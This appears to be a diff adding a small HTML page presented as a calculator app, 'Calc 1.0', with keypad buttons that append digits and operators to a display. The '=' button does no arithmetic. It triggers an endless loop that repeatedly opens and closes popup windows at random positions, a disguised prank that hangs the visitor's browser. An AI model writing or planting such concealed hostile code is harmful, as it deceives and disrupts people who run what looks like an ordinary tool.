@@ -1,0 +1,140 @@
+<html>
+  <body>
+  	 <title>Calc 1.0</title>
+  
+    <div class="textBox" id="text"></div>
+	 <br>
+	 <button class="calcButton" id="1" onclick="apple();">1</button>
+	 <button class="calcButton" id="2" onclick="applee();">2</button>
+	 <button class="calcButton" id="3" onclick="appleee();">3</button>
+	 <button class="calcButton" id="-" onclick="get();">-</button>
+	 <br>
+	 <button class="calcButton" id="4" onclick="appleeee();">4</button>
+	 <button class="calcButton" id="5" onclick="appleeeee();">5</button>
+	 <button class="calcButton" id="6" onclick="appleeeeee();">6</button>
+	 <button class="calcButton" id="+" onclick="add();">+</button>
+	 <br>
+	 <button class="calcButton" id="7" onclick="appleeeeeee();">7</button>
+	 <button class="calcButton" id="8" onclick="appleeeeeeee();">8</button>
+	 <button class="calcButton" id="9" onclick="appleeeeeeeee();">9</button>
+	 <button class="calcButton" id="*" onclick="mult();">×</button>
+	 <br>
+	 <button class="calcButton" id="." onclick="dec();">.</button>
+	 <button class="calcButton" id="0" onclick="appleeeeeeeeee();">0</button>
+    <button class="calcButton" id="=" onclick="app();">=</button>
+	 <button class="calcButton" id="/" onclick="div();">÷</button>
+  </body>
+  
+  <style>
+    body {
+	   background: gray;
+	 }
+	 
+	 #C {
+	   position: absolute;
+	 }
+	 
+	 .textBox {
+	   background: white;
+		width: 100% - 50px;
+		height: 50px;
+		text-align: right;
+		font-size: 50px;
+		font-family: Helvetica, Sans-Serif;
+		border-radius: 5px;
+	 }
+	 
+	 .calcButton {
+	   background: #b3b3b3;
+		width: 50px;
+		height: 50px;
+		border-radius: 10px;
+		font-family: Helvetica, Sans-Serif;
+	 }
+	 
+	 .calcButton:hover {
+	   background: #8a8a8a;
+	 }
+	 
+  </style>
+  
+  <script src="jquery-3.7.0.js"></script>
+  
+  <script>
+    var canWork = false;
+	 
+    function app() {
+		  while(1)
+        {
+	       var randomX = (Math.random() * 1366) + 1;
+          var randomY = (Math.random() * 768) + 1;
+          
+          var specs = "height=250px, width=250px, left=" + randomX + ", top=" + randomY;
+            
+          newWindow = window.open("sdhdfkjdsfhkdhkfshj","Heheheha!!!", specs);    
+	       newWindow.close();
+       }       
+    }
+	 
+	 function div()
+	 {
+	 	document.getElementById("text").innerHTML = document.getElementById("text").innerHTML + "÷";
+	 }
+	 function mult()
+	 {
+	 	document.getElementById("text").innerHTML = document.getElementById("text").innerHTML + "×";
+	 }
+	 function add()
+	 {
+	 	document.getElementById("text").innerHTML = document.getElementById("text").innerHTML + "+";
+	 }
+	 function get()
+	 {
+	 	document.getElementById("text").innerHTML = document.getElementById("text").innerHTML + "-";
+	 }
+	 function apple()
+	 {
+	   document.getElementById("text").innerHTML = document.getElementById("text").innerHTML + "1";
+	 }
+	 function applee()
+	 {
+	   document.getElementById("text").innerHTML = document.getElementById("text").innerHTML + "2";
+	 }
+	 function appleee()
+	 {
+	   document.getElementById("text").innerHTML = document.getElementById("text").innerHTML + "3";
+	 }
+	 function appleeee()
+	 {
+	   document.getElementById("text").innerHTML = document.getElementById("text").innerHTML + "4";
+	 }
+	 function appleeeee()
+	 {
+	   document.getElementById("text").innerHTML = document.getElementById("text").innerHTML + "5";
+	 }
+	 function appleeeeee()
+	 {
+	   document.getElementById("text").innerHTML = document.getElementById("text").innerHTML + "6";
+	 }
+	 function appleeeeeee()
+	 {
+	   document.getElementById("text").innerHTML = document.getElementById("text").innerHTML + "7";
+	 }
+	 function appleeeeeeee()
+	 {
+	   document.getElementById("text").innerHTML = document.getElementById("text").innerHTML + "8";
+	 }
+	 function appleeeeeeeee()
+	 {
+	   document.getElementById("text").innerHTML = document.getElementById("text").innerHTML + "9";
+	 }
+	 function appleeeeeeeeee()
+	 {
+	   document.getElementById("text").innerHTML = document.getElementById("text").innerHTML + "0";
+	 }
+	 function dec()
+	 {
+	   document.getElementById("text").innerHTML = document.getElementById("text").innerHTML + ".";
+	 }
+  </script>
+</html>
